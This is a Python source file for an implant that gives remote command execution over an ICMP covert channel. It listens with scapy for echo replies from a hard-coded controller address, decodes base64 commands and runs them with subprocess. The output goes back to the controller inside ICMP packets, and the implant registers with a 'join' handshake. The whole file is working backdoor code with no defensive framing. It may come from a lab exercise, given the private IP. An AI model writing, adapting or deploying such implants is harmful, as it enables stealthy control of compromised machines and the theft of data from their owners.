#!/usr/bin/python3

from scapy.all import sr,IP,ICMP,Raw,sniff
import base64
from shelly import Host
import shelly
import ast
import time
import subprocess
from subprocess import PIPE
from subprocess import STDOUT, check_output, TimeoutExpired
import pty

ICMP_ID = int(12800)
TTL = int(64)

class Implant(Host):
    
    def __init__(self, controller_ip):
        super().__init__()
        self.type = "implant"
        self.controller_ip = controller_ip
        self.time_limit = 2
        self.timer = 0
        self.time_gap = 0.2

    def sniff_callback(self, packet):        
        if packet[IP].src != self.controller_ip:
            return
        elif packet[IP].src == self.ip:
            return
        elif packet[ICMP].type != 0:
            return
        elif packet[ICMP].id != ICMP_ID:
            return
        elif not packet[Raw].load:
            return

        encoded_shellpack = (packet[Raw].load).decode('utf-8', errors='ignore')
        shellpack = base64.b64decode(encoded_shellpack).decode()
        unpacked = ast.literal_eval(shellpack)
        
        match unpacked['command']:
            case "join":
                self.join(unpacked)
            case "instruction":
                self.instruction(unpacked)
            case _:
                print("Default case")

    def join(self, shellpack):
        
        match shellpack['message']:
            case "how are you":
                response_shellpack = shelly.build_shellpack(self, "join", "fine thank you")
                shelly.send(self.controller_ip, response_shellpack)

        return

    def instruction(self, shellpack):
        try:
            if shellpack['message'] != 'request':
                raise Exception
            master_fd, slave_fd = pty.openpty()
            try:
                cmd = base64.b64decode(shellpack['data'].decode()).decode()
                cmd = cmd.split(" ")
                output = check_output(cmd, stdin=slave_fd, stderr=STDOUT, universal_newlines=True, timeout=3)
                
                response_shellpack = shelly.build_shellpack(self, "instruction", "response", output)
                shelly.send(self.controller_ip, response_shellpack)
            except TimeoutExpired:
                raise Exception


        except Exception:
            response_shellpack = shelly.build_shellpack(self, "error", "error with instruction") 
            shelly.send(self.controller_ip, response_shellpack)

def setup_implant() -> Implant:
    print("[ Setting up implant... ]")
    implant = Implant(controller_ip="192.168.157.6")
    print(implant)
    
    # Send join command
    shellpack = shelly.build_shellpack(implant, "join", "hello")
    shelly.send(implant.controller_ip, shellpack)
    return implant

if __name__ == "__main__":
    implant = setup_implant()
    print("[ ICMP Sniffing Started ]")

    sniff(iface=implant.iface, prn=implant.sniff_callback, filter="icmp", store="0")
